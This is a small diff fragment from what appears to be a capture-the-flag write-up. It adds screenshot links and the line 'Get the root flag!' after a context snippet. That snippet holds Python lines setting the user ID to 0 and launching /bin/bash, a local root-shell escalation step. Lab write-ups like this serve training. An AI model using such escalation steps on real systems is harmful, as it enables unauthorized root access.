@@ -181,3 +181,8 @@ Or get it localy and run it.
     os.setuid(0)
     os.system("/bin/bash")
 
+![image](https://github.com/user-attachments/assets/358bf82f-c230-4527-8cd4-1a560104a1b5)
+
+Get the root flag!
+
+![image](https://github.com/user-attachments/assets/776e3744-fc39-43ab-8039-0642018e9647)
